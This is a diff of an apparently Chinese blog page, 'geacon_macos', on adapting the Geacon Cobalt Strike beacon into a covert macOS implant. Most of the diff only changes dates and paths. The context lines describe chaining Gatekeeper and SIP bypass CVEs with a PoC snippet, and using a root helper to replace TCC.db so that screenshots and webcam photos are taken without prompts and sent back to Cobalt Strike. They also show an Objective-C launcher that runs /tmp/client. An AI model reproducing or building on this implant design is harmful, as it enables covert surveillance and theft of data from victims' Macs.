@@ -19,18 +19,18 @@
     <meta name="description" content="三个CVE CVE-2022-22616绕过GateKeeper修复版本macOS12.3   mkdir -p poc.app&#x2F;Contents&#x2F;MacOS echo &quot;#!&#x2F;bin&#x2F;bash&quot; &gt; poc.app&#x2F;Contents&#x2F;MacOS&#x2F;poc echo &quot;open -a Calculator&quot; &gt;&gt; poc.app&#x2F;Conten">
 <meta property="og:type" content="article">
 <meta property="og:title" content="geacon_macos">
-<meta property="og:url" content="https://binpwn.github.io/2024/04/25/geacon-macos/index.html">
+<meta property="og:url" content="https://binpwn.github.io/2023/11/25/geacon-macos/index.html">
 <meta property="og:site_name" content="binpwn&#39;s blog">
 <meta property="og:description" content="三个CVE CVE-2022-22616绕过GateKeeper修复版本macOS12.3   mkdir -p poc.app&#x2F;Contents&#x2F;MacOS echo &quot;#!&#x2F;bin&#x2F;bash&quot; &gt; poc.app&#x2F;Contents&#x2F;MacOS&#x2F;poc echo &quot;open -a Calculator&quot; &gt;&gt; poc.app&#x2F;Conten">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://binpwn.github.io/2024/04/25/geacon-macos/geacon_app_structure.png">
-<meta property="og:image" content="https://binpwn.github.io/2024/04/25/geacon-macos/geacon_func_structure.png">
-<meta property="article:published_time" content="2024-04-24T16:24:03.000Z">
-<meta property="article:modified_time" content="2024-04-24T17:26:08.963Z">
+<meta property="og:image" content="https://binpwn.github.io/2023/11/25/geacon-macos/geacon_app_structure.png">
+<meta property="og:image" content="https://binpwn.github.io/2023/11/25/geacon-macos/geacon_func_structure.png">
+<meta property="article:published_time" content="2023-11-24T16:24:03.000Z">
+<meta property="article:modified_time" content="2024-08-21T03:13:53.742Z">
 <meta property="article:author" content="DingJiayu">
 <meta property="article:tag" content="MacOS">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://binpwn.github.io/2024/04/25/geacon-macos/geacon_app_structure.png">
+<meta name="twitter:image" content="https://binpwn.github.io/2023/11/25/geacon-macos/geacon_app_structure.png">
   
   
   
@@ -211,8 +211,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-04-25 00:24" pubdate>
-          2024年4月25日 凌晨
+        <time datetime="2023-11-25 00:24" pubdate>
+          2023年11月25日 凌晨
         </time>
       </span>
     
@@ -297,6 +297,7 @@ gzip -c poc.app.zip &gt; poc.app.zip.gz
 
 run /tmp/exploit
 </code></pre>
+<p>​    </p>
 </li>
 <li><p>CVE-2022-26712<br>绕过SIP<br>修复版本macOS12.4</p>
 <blockquote>
@@ -319,7 +320,7 @@ run /tmp/exploit
 <li>elev<br>该程序主要作用是以root权限执行一些命令，比如操作TCC.db的shove命令。效果就是在有root的权限基础上，进一步借助root权限执行shove，将系统原有的TCC.db替换掉，新的TCC.db中有我们Geacon程序所需的权限。</li>
 <li>client<br>该程序就是Geacon程序，其中有截图、摄像头拍照功能，在截取屏幕内容和完成拍摄后是需要将图片回传至Cobalt Strike的。截图和调取摄像头都需要用户授予权限后才能使用，为了进一步隐蔽，上面通过借助提权程序和shove来为我们的Geacon程序提供预先设置好的权限。在前置工作完成的基础上，Geacon的功能是能够正常使用的，此时不会弹窗提示用户需要授权。这样Geacon程序是能够藏匿于目标系统中的。</li>
 </ul>
-<p><img src="/2024/04/25/geacon-macos/geacon_app_structure.png" srcset="/img/loading.gif" lazyload alt="App构成"></p>
+<p><img src="/2023/11/25/geacon-macos/geacon_app_structure.png" srcset="/img/loading.gif" lazyload alt="App构成"></p>
 <p>下面这个结构就是自己添加的两个功能，一个是调取摄像头拍照，另一个是用于图片回传；</p>
 <ul>
 <li>关于图片回传的背景<br>之前Geacon里面的功能是面向Windows开发的，其中有些函数的用法并不适用MacOS，比如管道。在Windows下可以不用去了解图片的传输格式，但是在Mac中由于之前的功能不适用所以会导致传输图片失败，这样就必须去了解图片的发送格式，然后自己再手动构造一个包就行，这个用于构造传输图片的包的功能实现在ding模块里。</li>
@@ -328,7 +329,7 @@ run /tmp/exploit
 <ul>
 <li>调取Macbook摄像头进行拍照<br>有了上面传输图片的基本功能后，可以进一步拓展。<br>当我们能调取摄像头进行拍照后，将其存为图片，继而可以将图片回传。</li>
 </ul>
-<p><img src="/2024/04/25/geacon-macos/geacon_func_structure.png" srcset="/img/loading.gif" lazyload alt="功能构成"></p>
+<p><img src="/2023/11/25/geacon-macos/geacon_func_structure.png" srcset="/img/loading.gif" lazyload alt="功能构成"></p>
 <h1 id="二-总体的大致实现流程"><a href="#二-总体的大致实现流程" class="headerlink" title="(二)总体的大致实现流程"></a>(二)总体的大致实现流程</h1><h2 id="App的可执行文件"><a href="#App的可执行文件" class="headerlink" title="App的可执行文件"></a>App的可执行文件</h2><p>下面代码做的事情：</p>
 <ul>
 <li>一个是将当前App路径记录下来，写进path文件里；</li>
@@ -336,11 +337,9 @@ run /tmp/exploit
 <li>最后执行client程序</li>
 </ul>
 <blockquote>
+<p>#import &lt;Foundation&#x2F;Foundation.h&gt;<br>    int main(int argc, const char * argv[]){</p>
 </blockquote>
-<pre><code class="hljs">#import &lt;Foundation/Foundation.h&gt;
-int main(int argc, const char * argv[])&#123;
-
-    NSBundle *myBundle = [NSBundle mainBundle];
+<pre><code class="hljs">    NSBundle *myBundle = [NSBundle mainBundle];
     NSString *str = [myBundle bundlePath];//app path
     NSString *path2file = [str stringByAppendingString:@&quot;/Contents/Resources/path&quot;];//write path to file
     [str writeToFile:path2file atomically:TRUE encoding:NSUTF8StringEncoding error:nil];
@@ -357,10 +356,6 @@ int main(int argc, const char * argv[])&#123;
     NSTask *client = [[NSTask alloc] init];
     [client setLaunchPath:@&quot;/tmp/client&quot;];
     [client launch];
-    
-
-    
-    
     return 0;
 &#125;
 </code></pre>
@@ -464,7 +459,7 @@ sleep 1
   <div class="license-box my-3">
     <div class="license-title">
       <div>geacon_macos</div>
-      <div>https://binpwn.github.io/2024/04/25/geacon-macos/</div>
+      <div>https://binpwn.github.io/2023/11/25/geacon-macos/</div>
     </div>
     <div class="license-meta">
       
@@ -476,7 +471,7 @@ sleep 1
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年4月25日</div>
+          <div>2023年11月25日</div>
         </div>
       
       
@@ -517,6 +512,12 @@ sleep 1
                   </article>
                   <article class="post-next col-6">
                     
+                    
+                      <a href="/2023/08/21/%E9%87%8D%E5%AE%9A%E5%90%91/" title="重定向">
+                        <span class="hidden-mobile">重定向</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
                     
                   </article>
                 </div>
